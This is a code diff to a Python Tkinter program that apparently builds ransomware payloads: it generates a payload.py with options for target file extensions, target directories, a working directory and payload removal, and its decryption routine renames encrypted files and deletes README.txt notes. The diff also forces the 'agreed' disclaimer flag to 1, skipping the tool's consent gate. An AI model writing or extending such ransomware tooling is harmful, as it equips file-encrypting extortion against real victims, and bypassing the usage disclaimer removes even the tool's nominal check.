@@ -179,7 +179,7 @@ class MainWindow(Tk):
         }
 
 
-        #<activate>
+        self.options['agreed'].set(1)
         #<activate>
 
         if not self.options['agreed'].get() == 1:
@@ -712,6 +712,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         self.options['new_working_dir'].focus()
 
     def change_target_dirs(self):
+        self.options['working_dir'].set(self.options['new_working_dir'].get())
         self.options['target_dirs'].set(self.options['new_target_dirs'].get('1.0', END))
         self.dirs.destroy()
 
@@ -733,7 +734,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 self.options['debug'].get(),
                 self.options['target_ext'].get(),
                 self.options['target_dirs'].get(),
-                self.options['remove_payload'].get())
+                self.options['remove_payload'].get(),
+                self.options['working_dir'].get())
             messagebox.showinfo('SUCCESS', 'Payload successfully generated!\n\nFile saved to ./payload.py')
             self.gen.destroy()
         except Exception as e:
@@ -782,11 +784,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                             rename_file(os.path.join(path, name))
                             print("[RENAMED] %s" % name)
                             counter+=1
-                        elif name == 'README.txt':
-                            os.remove(os.path.join(path, name))
-                            print('[DELETED] %s/%s' % (path, name))
-                        else:
-                            return
+                    elif name == 'README.txt':
+                        os.remove(os.path.join(path, name))
+                        print('[DELETED] %s/%s' % (path, name))
                     else:
                         print("[Skipped] %s" % name)
             print("\n[DONE] Decrypted %i files" % counter)
